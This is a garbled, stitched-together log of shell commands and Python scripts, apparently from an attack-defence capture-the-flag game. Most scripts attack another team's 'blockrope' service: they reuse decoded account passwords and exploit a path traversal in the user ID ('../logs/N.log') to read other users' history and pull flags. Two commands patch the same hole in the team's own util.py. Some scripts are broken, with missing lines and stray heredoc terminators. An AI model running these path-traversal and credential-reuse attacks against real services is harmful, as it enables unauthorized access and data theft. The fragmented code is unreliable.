/bin/bash -lc "ssh team2_prod 'python3 - <<\"PY\"
import socket,re,glob,os
base=\"/srv/challenge/blockrope/app/accounts\"
creds=[]
for p in glob.glob(base+\"/*\"):
    aid=os.path.basename(p)
    with open(p) as f:
        lines=f.read().splitlines()
    pw=lines[1]
    # decode base64 to plaintext for login
    import base64
    try:
        plain=base64.b64decode(pw).decode(\"latin-1\")
    except Exception:
        continue
    creds.append((aid,plain))

def recv_until(s,needle,timeout=2.0):
    s.settimeout(timeout)
    data=b\"\"
    while needle not in data:
        chunk=s.recv(4096)
        if not chunk: break
        data+=chunk
    return data

for aid,pw in creds:
    try:
        s=socket.create_connection((\"team1_prod\",1337),timeout=2)
        recv_until(s,b\"> \")
        s.sendall(b\"login\\n\")
        recv_until(s,b\"Enter User ID:\")
        s.sendall((aid+\"\\n\").encode())
        recv_until(s,b\"Enter password:\")
        s.sendall((pw+\"\\n\").encode())
        out=recv_until(s,b\"> \",timeout=1.5)
        txt=out.decode(\"latin-1\",\"ignore\")
        if \"Welcome user\" in txt:
            s.sendall(b\"history\\n\")
            out2=recv_until(s,b\"<Press Enter to continue>\",timeout=1.5)
            t=out2.decode(\"latin-1\",\"ignore\")
            m=re.search(r\"FLAG\\{["'^}]+'"\\}\",t)
            if m:
                print(\"HIT\",aid,m.group(0))
                break
            else:
                print(\"LOGIN_NOFLAG\",aid)
        s.close()
    except Exception as e:
        pass
PY'"

import socket,time,re
pw=(\"ûï¾\"*16)
flag_re=re.compile(r\"FLAG\\{["'^}]+'"\\}\")


def recv_some(s,secs=1.0):
    end=time.time()+secs;out=b\"\"
    while time.time()<end:
        s.settimeout(max(0.01,end-time.time()))
        try:
            d=s.recv(4096)
            if not d: break
            out+=d
        except Exception:
            pass
    return out

for i in range(12):
    uid=f\"../logs/{i}.log\"
    try:
        s=socket.create_connection((\"team1_prod\",1337),timeout=3)
        recv_some(s,0.9)
        s.sendall(b\"login\\n\"); recv_some(s,0.4)
        s.sendall(uid.encode()+b\"\\n\"); recv_some(s,0.4)
        s.sendall(pw.encode(\"utf-8\")+b\"\\n\")
        out=recv_some(s,1.0)
        if b\"Welcome user\" not in out:
            s.close(); continue
        s.sendall(b\"history\\n\")
        h=recv_some(s,1.4).decode(\"latin-1\",\"ignore\")
        m=flag_re.findall(h)
        print(uid,\"flags\",m[-2:])
        if m:
            print(\"FOUND\",m[-1])
            break
        s.close()
    except Exception:
        pass
PY'"

acts.x:
/bin/bash -lc "ssh team2_prod 'cd /srv/challenge/blockrope/app && cp util.py util.py.bak && python3 - <<\"PY\"
from pathlib import Path
p=Path(\"util.py\")
s=p.read_text()
old='''class BlockReader():
    def __init__(self, account_id: int):
        self.id = account_id
        self.file = io.open(f\"accounts/{account_id}\", \"r+\")
        self.lines = self.file.readlines()
'''
new='''class BlockReader():
    def __init__(self, account_id: int):
        account_str = str(account_id)
        if not account_str.isdigit():
            raise FileNotFoundError(\"User does not exist\")

        self.id = account_str
        self.file = io.open(f\"accounts/{account_str}\", \"r+\")
        self.lines = self.file.readlines()
'''
if old not in s:
    raise SystemExit('target block not found')
p.write_text(s.replace(old,new,1))
print('patched')
PY
sed -n \"90,150p\" util.py'"

/bin/bash -lc "ssh team2_prod \"cd /srv/challenge/blockrope/app && cp util.py util.py.bak && python3 - <<'PY'
from pathlib import Path
p=Path('util.py')
s=p.read_text()
old = \\\"\\\"\\\"class BlockReader():
    def __init__(self, account_id: int):
        self.id = account_id
        self.file = io.open(f\\\"accounts/{account_id}\\\", \\\"r+\\\")
        self.lines = self.file.readlines()
\\\"\\\"\\\"
new = \\\"\\\"\\\"class BlockReader():
    def __init__(self, account_id: int):
        account_str = str(account_id)
        if not account_str.isdigit():
            raise FileNotFoundError(\\\"User does not exist\\\")

        self.id = account_str
        self.file = io.open(f\\\"accounts/{account_str}\\\", \\\"r+\\\")
        self.lines = self.file.readlines()
\\\"\\\"\\\"
if old not in s:
    raise SystemExit('target block not found')
p.write_text(s.replace(old,new,1))
print('patched')
PY
sed -n '90,150p' util.py\""

import socket,time,re,sys
flag_re=re.compile(r\"FLAG\\{["'^}]+'"\\}\")
uid=\"../logs/0.log\"
pw=(\"ûï¾\"*16).encode(\"utf-8\")

def recv_some(s,secs=1.0):
    end=time.time()+secs;out=b\"\"
    while time.time()<end:
        s.settimeout(max(0.01,end-time.time()))
        try:
            d=s.recv(4096)
            if not d: break
            out+=d
        except Exception:
            pass
    return out

for attempt in range(30):
    try:
        s=socket.create_connection((\"team1_prod\",1337),timeout=3)
        recv_some(s,0.7)
        s.sendall(b\"login\\n\"); recv_some(s,0.3)
        s.sendall(uid.encode()+b\"\\n\"); recv_some(s,0.3)
        s.sendall(pw+b\"\\n\")

            s.sendall(b\"history\\n\")

            flags=flag_re.findall(h)
            if flags:
                print(flags[-1])
                sys.exit(0)
        s.close()
    except Exception:
        pass
    time.sleep(2)
print(\"NOFLAG\")

import socket,time,re
pw=('ûï¾'*16).encode('utf-8')
flag_re=re.compile(r'FLAG\\{["'^}]+'"\\}')

def recv(s,t=1.0):
    end=time.time()+t; out=b''
    while time.time()<end:
        s.settimeout(max(0.01,end-time.time()))
        try:
            d=s.recv(4096)
            if not d: break
            out+=d
        except Exception:
            pass
    return out
for i in [1,2,0]:
    uid=f'../logs/{i}.log'
    s=socket.create_connection(('team1_prod',1337),timeout=3)
    recv(s,1)
    s.sendall(b'login\\n'); recv(s,0.3)
    s.sendall(uid.encode()+b'\\n'); recv(s,0.3)
    s.sendall(pw+b'\\n')
    out=recv(s,0.8)
    if b'Welcome user' not in out:
        print(uid,'login-fail'); continue
    s.sendall(b'history\\n')
    h=recv(s,1.3).decode('latin-1','ignore')
    flags=flag_re.findall(h)
    print(uid,'flags',flags[-3:])
